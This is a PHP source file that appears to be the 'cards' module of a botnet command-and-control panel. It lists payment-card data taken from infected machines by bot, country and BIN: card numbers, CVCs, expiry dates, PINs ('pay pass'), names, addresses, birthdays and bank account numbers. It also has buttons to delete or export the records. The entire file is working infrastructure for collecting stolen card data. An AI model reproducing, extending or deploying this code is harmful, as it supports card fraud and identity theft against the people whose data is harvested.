<?php
require_once "cmd_mod.php";

class cards extends modBase
{
	protected $module_name = 'cards';

	function get_filter()
	{
		$patt = modBase::$filters['country'];
		$country_input = <<<PHP
<div class="col-md-2 tagsinput-primary">
		<input class="form-control tagsinput" id="cards-filter-country" pattern="{$patt}" 
			size="10" placeholder="de, gb, fr" type="text" title="Use comma for multiply values: 1,2,3" data-role="tagsinput" value="%FILTER_COUNTRY%" />
	</div>
PHP;
		$country_input = str_replace('%FILTER_COUNTRY%', hlp::get($this->filter_values, 'country', ''), $country_input);
	
		$online_input = <<<PHP
	<div class="col-md-1 textwhite">
		<label class='checkbox' for="cards-filter-only_online_bots">
			<input id="cards-filter-only_online_bots" type="checkbox" data-toggle="checkbox" %FILTER_ONLY_ONLINE_BOTS% />
		</label>
	</div>
PHP;

		$chk = (hlp::get($this->filter_values, 'only_online_bots', false))? 'checked' : '';
		$online_input = str_replace('%FILTER_ONLY_ONLINE_BOTS%', $chk, $online_input);
		
		$fields = array(
		// id, name, placeholder, custom_pattern, is_like
			array('bot_id', 'Bot ID', 'Bot ID'),
			array('bot_comment', 'Bot comment', 'Part of any your comments'),
			array('Country', $country_input),
			array('number', 'Card number or BIN', '1234 1234 1234 1234'), // modBase::$filters['cc']
			array('Online only', $online_input),
		);
		
		return $this->build_filter($fields);
	}
	
	function get_content()
	{
		$comment = '';
		if(isset($this->filter_values['bot_comment']))
		{
			$comment = trim($this->filter_values['bot_comment']);
			unset($this->filter_values['bot_comment']);
		}
		
		$only_online = 0;
		if(isset($this->filter_values['only_online_bots']))
		{
			$only_online = ($this->filter_values['only_online_bots'])? 1 : 0;
			unset($this->filter_values['only_online_bots']);
		}

		$fields = 'bot_cards.id, bot_cards.bot_id, bot_cards.number, month, year, cvc, ts, bot_cards.comment, pay_pass, full_name, address, zip, phone, sort, account_number, birthday';
		if($comment || $only_online)
		{
			$sql = "select %FIELDS% from bot_cards INNER JOIN bots ON bots.bot_id=bot_cards.bot_id ";
			
			if($comment)
				$sql = $this->addWhere($sql, "bots.comment like({$this->db->quote_like($comment)})", 'bot_cards');
			
			if($only_online)
			$sql = $this->addWhere($sql, "is_online(bots.timestamp)=1", 'bot_cards');

		}else{
			
			$sql = "select %FIELDS% from bot_cards";
		}
		
		$sql = $this->addWhere($sql, $this->filter_values, array('bot_id', 'country'));
		$sql .= " order by `ts` desc";

		// count request
		$total_rows = $this->db->exec(str_replace('%FIELDS%', 'count(bot_cards.id)', $sql), null, true)[0][0];

		$paging = $this->get_limit($total_rows, $this->results_on_page);
		$sql .= $paging['sql'];

		// data request
		$data = $this->db->exec(str_replace('%FIELDS%', $fields, $sql), null, true);

		$headers = array();
		$headers[] = '<a href="javascript:select_all(\'input[id^=&quot;cards-table-chk-&quot;]\');undefined"><span class="fui-checkbox-checked" title="Check all"></span></a>';
		$headers[] = 'Received at';
		$headers[] = 'Bot';
		$headers[] = 'Card';
		$headers[] = 'Month/Year';
		$headers[] = 'CVC';
		$headers[] = 'Details';
		$headers[] = 'Comment';
		$headers[] = 'Action';
	
		$rows = array();
		foreach($data as $row)
		{
			$tmp = array();

			$tmp[] = "<label class='checkbox' for='cards-table-chk-{$row['id']}'>
					<input type='checkbox' value='{$row['id']}' id='cards-table-chk-{$row['id']}' data-toggle='checkbox' />
				</label>";

			$tmp[] = hlp::human_date($row['ts']);
			$tmp[] = "<a onmouseout='hide_bot_details()' onmouseover='show_bot_details(this, \"{$row['bot_id']}\")' href='#page:menu-bot;bot_id={$row['bot_id']}'>Details</a>";
			$tmp[] = $row['number'];
			$tmp[] = $row['month'] . "/" . $row['year'];
			$tmp[] = $row['cvc'];
			$info = <<<PHP
Pay pass: {$row['pay_pass']}
Full name: {$row['full_name']}
Address: {$row['address']}
ZIP: {$row['zip']}
Phone: {$row['phone']}
Birthday: {$row['birthday']}
PHP;

			if($row['sort'])
				$info .= "\nSort: {$row['sort']}";
			
			if($row['account_number'])
				$info .= "\nAccount number: {$row['account_number']}";
				
			$tmp[] = "<textarea rows='2' class='form-control'>{$info}</textarea>";
			$tmp[] = $this->get_comment_cell($row);
			$tmp[] = "<button type='button' class='btn btn-danger' onclick='show_ajax_form(\"panel_delete_cards\", [{$row['id']}])'>Delete</button>";
			$rows[] = $tmp;
		}

		$content = $this->get_table($rows, $headers, 'textcenter');
		
		// TODO show bot details - online status, banks, other details
		$paging = $this->get_limit($total_rows, $this->results_on_page);
	
		$buttons = array(
			array('Delete', 'Delete all selected items', 'show_ajax_form("panel_delete_cards")', 'danger'),
			array('Export', 'Export all selected items', 'export_txt_csv("cards")', 'info'),
		);
		
		return $this->wrap_content("Total: {$paging['total_rows']}", $content, $paging['pages'], $buttons);
	}

}
